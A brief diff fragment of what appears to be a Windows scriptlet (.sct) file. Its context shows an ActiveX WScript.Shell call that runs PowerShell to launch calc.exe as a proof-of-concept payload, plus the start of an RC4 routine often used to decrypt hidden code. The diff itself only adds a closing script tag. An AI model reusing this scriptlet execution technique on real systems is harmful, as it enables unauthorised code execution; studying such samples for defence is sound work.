@@ -14,5 +14,6 @@ var r = new ActiveXObject("WScript.Shell").Run("powershell calc.exe");
 <![CDATA[
 rc4=function(key,str){var s=[],j=0,x,res='';for(var i=0;i<256;i++){s[i]=i;}
 ]]>
+</script>
 </component>
 </package>
